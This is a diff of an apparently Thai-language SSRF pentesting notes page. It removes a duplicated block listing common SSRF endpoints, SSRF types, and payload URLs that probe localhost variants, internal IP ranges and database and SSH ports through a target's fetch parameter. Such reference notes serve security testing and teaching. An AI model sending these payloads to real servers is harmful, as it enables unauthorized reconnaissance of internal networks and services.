@@ -120,67 +120,6 @@ http://<target_url>/fetch?url=http://192.168.1.10:27017 # MongoDB
 ```
 **หมายเหตุ:** ดูจาก response time หรือ error message เพื่อบอกว่า port เปิดหรือปิด
 
-> [!WARNING] Common SSRF Endpoints
-> - File upload from URL
-> - Image/document fetchers
-> - Webhook configurations
-> - API proxies
-> - URL preview/metadata scrapers
-> - PDF/Screenshot generators
-
-## 🟦 Types of SSRF
-
-### 1. Basic SSRF (In-band)
-เห็น response จาก internal service โดยตรงบนหน้าเว็บ สามารถอ่านข้อมูลที่ server ดึงมาได้ทันที
-
-### 2. Blind SSRF (Out-of-Band)
-ไม่เห็น response โดยตรง แต่สามารถยืนยันได้จากการตรวจสอบ logs บน server ที่ผู้โจมตีควบคุม หรือจาก timing
-
-### 3. Semi-Blind SSRF
-เห็นบางส่วนของ response เช่น HTTP status code, response time, หรือ error messages แต่ไม่เห็น response body เต็ม
-
-### 4. SSRF via XXE
-ใช้ XXE vulnerability เพื่อทำ SSRF (ดูที่ [[XXE (XML External Entity)]])
-
-### 5. SSRF via PDF/Image Processing
-ใช้ HTML injection ใน PDF generator หรือ image processor เพื่อส่ง requests
-
-## 🔨 Exploitation
-
-### Basic SSRF - Internal Network Access
-
-**Localhost Access:**
-```bash
-# ทดสอบ localhost variations
-http://<target_url>/fetch?url=http://127.0.0.1
-http://<target_url>/fetch?url=http://localhost
-http://<target_url>/fetch?url=http://0.0.0.0
-http://<target_url>/fetch?url=http://[::1]
-http://<target_url>/fetch?url=http://0177.0.0.1  # octal
-```
-**หมายเหตุ:** ใช้เพื่อเข้าถึง services ที่ bind กับ localhost เท่านั้น
-
-**Internal Network Scanning:**
-```bash
-# สแกนหา internal services
-http://<target_url>/fetch?url=http://192.168.1.1
-http://<target_url>/fetch?url=http://192.168.1.10
-http://<target_url>/fetch?url=http://10.0.0.1
-http://<target_url>/fetch?url=http://172.16.0.1
-```
-
-**Port Scanning:**
-```bash
-# ตรวจสอบ common ports
-http://<target_url>/fetch?url=http://192.168.1.10:22    # SSH
-http://<target_url>/fetch?url=http://192.168.1.10:80    # HTTP
-http://<target_url>/fetch?url=http://192.168.1.10:443   # HTTPS
-http://<target_url>/fetch?url=http://192.168.1.10:3306  # MySQL
-http://<target_url>/fetch?url=http://192.168.1.10:6379  # Redis
-http://<target_url>/fetch?url=http://192.168.1.10:27017 # MongoDB
-```
-**หมายเหตุ:** ดูจาก response time หรือ error message เพื่อบอกว่า port เปิดหรือปิด
-
 ### Cloud Metadata Access
 
 **AWS Metadata (IMDSv1):**
